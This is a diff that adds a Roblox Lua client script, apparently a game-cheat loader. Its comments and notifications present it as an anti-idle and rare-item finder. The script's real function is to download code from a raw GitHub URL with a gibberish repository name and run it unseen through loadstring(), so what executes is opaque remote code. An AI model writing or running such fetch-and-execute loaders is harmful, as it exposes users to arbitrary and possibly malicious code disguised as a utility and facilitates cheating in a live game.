@@ -1,0 +1,43 @@
+-- 移除所有UI元素，保留核心功能逻辑
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- 修复：移除不必要的Part（原UI辅助零件，无实际作用）
+
+-- 加载远程脚本的函数（添加错误捕获，修复执行逻辑）
+local function loadRemoteScript()
+    -- 状态提示（通过通知替代原UI文本）
+    local function showNotification(title, text, duration)
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Duration = duration or 3
+        })
+    end
+
+    -- 显示加载状态
+    showNotification("运行状态", "开启防闲置中")
+    task.wait(0.1)
+    showNotification("运行状态", "正在寻找稀有物品")
+    task.wait(0.1)
+
+    -- 修复：添加错误处理，避免远程脚本加载失败导致整个脚本崩溃
+    local success, err = pcall(function()
+        -- 加载远程代码（注意：请确认链接安全性）
+        local remoteCode = game:HttpGet("https://raw.githubusercontent.com/lyynb666ezlol/jejsjwhwjajshsjnsjajqkwkdjdhieekjehwhwjw/refs/heads/main/2083622")
+        loadstring(remoteCode)()
+    end)
+
+    -- 显示加载结果
+    if success then
+        showNotification("加载成功", "功能已启动")
+    else
+        showNotification("加载失败", "错误信息：" .. tostring(err), 10)
+    end
+end
+
+-- 确保在客户端环境正确执行
+if player == Players.LocalPlayer then
+    loadRemoteScript()
+end
